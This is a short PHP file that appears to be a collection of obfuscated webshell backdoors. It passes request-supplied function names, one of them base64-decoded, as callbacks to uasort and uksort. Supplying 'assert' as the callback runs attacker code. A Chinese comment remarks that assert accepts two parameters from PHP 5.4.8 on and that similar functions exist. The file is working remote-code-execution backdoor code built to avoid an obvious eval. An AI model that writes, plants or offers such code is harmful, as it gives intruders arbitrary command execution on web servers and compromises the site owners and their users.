<?php 
$act = $_POST['act'];
$payload = array('test',$_POST['faith']);
uasort($payload, base64_decode($act));
#php5.4.8+中的assert能够接受两个参数，类似的还有这些
$e = $_REQUEST['e'];
$arr = array('test' => 1, $_REQUEST['pass'] => 2);
uksort($arr, $e);
 
?>